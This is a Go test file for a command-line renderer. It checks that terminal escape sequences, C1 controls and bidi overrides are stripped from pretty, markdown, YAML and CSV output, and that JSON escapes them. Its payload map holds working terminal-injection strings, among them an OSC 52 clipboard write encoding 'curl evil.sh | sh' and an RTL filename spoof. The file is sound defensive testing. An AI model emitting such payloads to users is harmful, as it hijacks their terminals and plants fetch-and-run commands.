package cli

import (
	"bytes"
	"encoding/json"
	"regexp"
	"strings"
	"testing"

	"github.com/this-is-tobi/rta/pkg/view"
)

// payloads are the sequences worth naming individually, because each one
// buys the attacker something different.
var payloads = map[string]string{
	// Writes the base64 into the reader's system clipboard. Enabled by
	// default in iTerm2, kitty, foot, WezTerm and Windows Terminal, and in
	// tmux with set-clipboard on. Decodes here to: curl evil.sh | sh
	"osc52 clipboard write": "ok\x1b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\x07",
	// Rewrites the window title. Some terminals will report it back.
	"osc0 window title": "ok\x1b]0;PWNED\x07",
	// Erases what was printed above, including the command that produced it.
	"csi erase display": "ok\x1b[2J",
	// Moves the cursor, so subsequent output lands over earlier output.
	"csi cursor move": "ok\x1b[10;10H",
	// No escape at all: a bare CR returns to column 0, so the line on screen
	// reads EVIL while the data says safe. The one that survives a naive
	// "strip ESC sequences" filter.
	"bare cr overwrite": "safe\rEVIL",
	// Audible, and repeatable enough to be a denial of attention.
	"bel": "ok\a",
	// CSI in its 8-bit form. ansi.Strip does not treat it as an introducer,
	// so it is the case that needs the C1 range and not just the parser.
	"c1 csi": "ok\u009b2J",
	// No control character at all, and a terminal that implements bidi acts
	// on it anyway: this filename is drawn as invoiceexe.pdf.
	"bidi override": "invoice" + string(rune(0x202e)) + "fdp.exe",
}

// escaped reports whether anything in out could still be acted on by a
// terminal.
func escaped(out string) bool {
	return strings.ContainsAny(out, "\x1b\a\r") || strings.ContainsRune(out, 0x9b) ||
		strings.ContainsFunc(out, func(r rune) bool {
			return (r >= 0x202a && r <= 0x202e) || (r >= 0x2066 && r <= 0x2069)
		})
}

// withPayload builds one instance of each view type carrying p in every
// string a renderer prints.
func withPayload(p string) map[string]view.View {
	return map[string]view.View{
		"text":     view.Text{Body: p},
		"keyvalue": view.KeyValue{Pairs: []view.Pair{{Key: p, Value: p}}},
		"table": view.Table{
			Columns: []view.Column{{Name: p}},
			Rows:    [][]string{{p}},
		},
		"tree": view.Tree{Roots: []view.Node{
			{Label: p, Detail: p, Children: []view.Node{{Label: p, Detail: p}}},
		}},
		"chart": view.Chart{
			Kind:   view.ChartBar,
			Series: []view.Series{{Name: p, Points: []float64{1}}},
			Unit:   p,
		},
		"sections": view.Sections{
			Items:    []view.Section{{Title: p, View: view.Text{Body: p}}},
			Warnings: []view.Error{{Code: "x.y.z", Message: p, Hint: p}},
		},
		"error": &view.Error{Code: "x.y.z", Message: p, Hint: p},
	}
}

// A view is data from somewhere else — an HTTP body, a DNS record, a
// filename, a database row — so "plugins do not emit ANSI" was
// never a property the producer could be trusted for. The renderer is where
// it becomes true.
func TestNoEscapeSequenceReachesTheTerminal(t *testing.T) {
	for name, p := range payloads {
		for kind, v := range withPayload(p) {
			for _, f := range []Format{Pretty, Markdown} {
				var buf bytes.Buffer
				if err := Render(&buf, v, Options{Format: f, NoColor: true, Width: 80}); err != nil {
					t.Fatalf("%s/%s/%s: %v", name, kind, f, err)
				}
				if escaped(buf.String()) {
					t.Errorf("%s survived %s as %s: %q", name, kind, f, buf.String())
				}
			}
		}
	}
}

// A markdown body cannot spell a sequence out for the markdown renderer to
// write.
//
// goldmark decodes character references, so &#x1b; is six ASCII characters in
// the note — nothing sanitize has a reason to touch — and a real ESC in what
// glamour writes after it. A note an agent added over MCP put an OSC 52 on the
// operator's clipboard the moment they ran `rta note show`. &#x9d; and &#x8d;
// are holes in the cp1252 table HTML maps &#128;-&#159; through, so they come
// out as the C1 controls themselves; &#8238; is the right-to-left override.
func TestAMarkdownCharacterReferenceCannotSpellASequence(t *testing.T) {
	esc, bel := string(rune(0x1b)), string(rune(0x07))
	body := "see &#x1b;]52;c;Y3VybA==&#x07; &#x1b;]0;t&#x07; &#x1b;[2J &#8238;fdp.exe " +
		"&#x9d;0;t&#x9c; &#x8d; and [a link](https://example.com/&#x1b;]0;t&#x07;) end"
	sgr := regexp.MustCompile(regexp.QuoteMeta(esc) + `\[[0-9;:]*m`)
	// What a styled render may keep, taken out before looking for what it
	// may not: its colour, and the OSC 8 around a link, which glamour writes
	// with the destination as goldmark left it — the reference undecoded.
	kept := regexp.MustCompile(regexp.QuoteMeta(esc) + `(\[[0-9;:]*m|\]8;[^` + esc + bel + `]*` + bel + `)`)
	for _, noColor := range []bool{true, false} {
		var buf bytes.Buffer
		md := view.Text{Body: body, Markdown: true}
		if err := Render(&buf, md, Options{Format: Pretty, NoColor: noColor, Width: 80}); err != nil {
			t.Fatal(err)
		}
		out := buf.String()
		left := kept.ReplaceAllString(out, "")
		if escaped(left) || strings.ContainsFunc(left, func(r rune) bool { return r >= 0x80 && r <= 0x9f }) {
			t.Errorf("no-color=%v: a sequence the body spelled reached the terminal: %q", noColor, out)
		}
		if !strings.Contains(out, "fdp.exe") || !strings.Contains(out, "end") {
			t.Errorf("no-color=%v: the text around the references went with them: %q", noColor, out)
		}
		if !noColor && !sgr.MatchString(out) {
			t.Errorf("the styling went too: %q", out)
		}
	}
}

// What cleaning the rendered markdown keeps: glamour's styling and a link
// whose target reads as what it is, on a terminal; nothing at all when the
// output is not styled, where an escape is bytes in a file.
func TestRenderedMarkdownKeepsItsStylingAndAnHonestLink(t *testing.T) {
	esc := string(rune(0x1b))
	md := view.Text{Body: "see [the docs](https://example.com/a) now", Markdown: true}
	var buf bytes.Buffer
	if err := Render(&buf, md, Options{Format: Pretty, Width: 80}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(buf.String(), esc+"]8;") || !strings.Contains(buf.String(), esc+"[") {
		t.Errorf("a styled render lost its link or its colour: %q", buf.String())
	}
	buf.Reset()
	if err := Render(&buf, md, Options{Format: Pretty, NoColor: true, Width: 80}); err != nil {
		t.Fatal(err)
	}
	if out := buf.String(); strings.Contains(out, esc) || !strings.Contains(out, "https://example.com/a") {
		t.Errorf("an unstyled render kept an escape, or lost the link's text: %q", out)
	}
}

// RenderError is a separate entry point, and AsError puts a foreign error's
// own text into Message — so a hostile server's error string is as much a
// display channel as its response body was.
func TestNoEscapeSequenceReachesTheTerminalThroughAnError(t *testing.T) {
	for name, p := range payloads {
		for _, f := range []Format{Pretty, Markdown} {
			var buf bytes.Buffer
			e := &view.Error{Code: "x.y.z", Message: p, Hint: p}
			if err := RenderError(&buf, e, Options{Format: f, NoColor: true, Width: 80}); err != nil {
				t.Fatalf("%s/%s: %v", name, f, err)
			}
			if escaped(buf.String()) {
				t.Errorf("%s survived an error as %s: %q", name, f, buf.String())
			}
			if e.Message != p {
				t.Errorf("RenderError mutated the caller's error: %q", e.Message)
			}
		}
	}
}

// json is the byte-exact channel and stays that way: it escapes the control
// character rather than dropping it, so it is lossless and safe at once, and
// making it lossy for the sake of a display problem would break the one
// format the contract promises works in a pipe. Every payload, the bidi
// override included, comes out escaped and reads back as it went in.
func TestJSONStaysByteExact(t *testing.T) {
	for name, p := range payloads {
		v := view.KeyValue{Pairs: []view.Pair{{Key: "k", Value: p}}}
		var buf bytes.Buffer
		if err := Render(&buf, v, Options{Format: JSON}); err != nil {
			t.Fatal(err)
		}
		if escaped(buf.String()) {
			t.Errorf("%s: json emitted it raw: %q", name, buf.String())
		}
		var back struct {
			Pairs []view.Pair `json:"pairs"`
		}
		if err := json.Unmarshal(buf.Bytes(), &back); err != nil || len(back.Pairs) != 1 || back.Pairs[0].Value != p {
			t.Errorf("%s: json read back as %+v (%v), want the value unchanged", name, back, err)
		}
	}
}

// yaml and csv are cleaned like the presentation formats, because neither is
// safe by construction: goccy/go-yaml puts a control character straight into
// a plain scalar, and encoding/csv quotes for comma, quote and newline only.
// Reading `-o yaml` in a terminal is the ordinary way to use it, so a raw
// OSC 52 there is the same attack as in the pretty renderer with an extra
// flag on the end.
func TestYAMLAndCSVAreCleaned(t *testing.T) {
	for name, p := range payloads {
		var buf bytes.Buffer
		kv := view.KeyValue{Pairs: []view.Pair{{Key: "k", Value: p}}}
		if err := Render(&buf, kv, Options{Format: YAML}); err != nil {
			t.Fatal(err)
		}
		if escaped(buf.String()) {
			t.Errorf("%s survived yaml: %q", name, buf.String())
		}
		buf.Reset()
		tbl := view.Table{Columns: []view.Column{{Name: "A"}}, Rows: [][]string{{p}}}
		if err := Render(&buf, tbl, Options{Format: CSV}); err != nil {
			t.Fatal(err)
		}
		if escaped(buf.String()) {
			t.Errorf("%s survived csv: %q", name, buf.String())
		}
	}
}

// Content a value may legitimately carry must survive, or the control turns
// into data loss: a certificate PEM, a JSON body and a stack trace are all
// multi-line, and a tab is how half the world's output is aligned.
func TestNewlineAndTabSurvive(t *testing.T) {
	v := view.Text{Body: "one\ntwo\tthree"}
	var buf bytes.Buffer
	if err := Render(&buf, v, Options{Format: Pretty, NoColor: true, Width: 80}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(buf.String(), "one\ntwo") {
		t.Errorf("the newline was dropped: %q", buf.String())
	}
	if !strings.Contains(buf.String(), "\t") {
		t.Errorf("the tab was dropped: %q", buf.String())
	}
}

// The TUI re-renders every pane on every keystroke, so the overwhelmingly
// common case — data with nothing wrong with it — must not allocate a copy
// of the view to discover that. Identity is the observable form of that.
func TestCleanViewsAreNotCopied(t *testing.T) {
	tbl := view.Table{
		Columns: []view.Column{{Name: "A"}},
		Rows:    [][]string{{"one"}, {"two"}},
	}
	got, ok := sanitize(tbl).(view.Table)
	if !ok {
		t.Fatal("sanitize changed the type")
	}
	if &got.Rows[0][0] != &tbl.Rows[0][0] {
		t.Error("a clean table was copied")
	}
	kv := view.KeyValue{Pairs: []view.Pair{{Key: "k", Value: "v"}}}
	if &sanitize(kv).(view.KeyValue).Pairs[0] != &kv.Pairs[0] {
		t.Error("a clean keyvalue was copied")
	}
}

// A dirty view must not be cleaned in place: the TUI holds one view and
// renders it repeatedly, and the same value is handed to the json path by
// `rta ... -o json` in another process — but more simply, a function that
// edits its argument is a function whose second caller gets a surprise.
func TestSanitizeDoesNotMutateItsArgument(t *testing.T) {
	const p = "ok\x1b[2J"
	tbl := view.Table{Columns: []view.Column{{Name: p}}, Rows: [][]string{{p}}}
	_ = sanitize(tbl)
	if tbl.Rows[0][0] != p || tbl.Columns[0].Name != p {
		t.Errorf("the caller's table was rewritten: %q / %q", tbl.Rows[0][0], tbl.Columns[0].Name)
	}
}
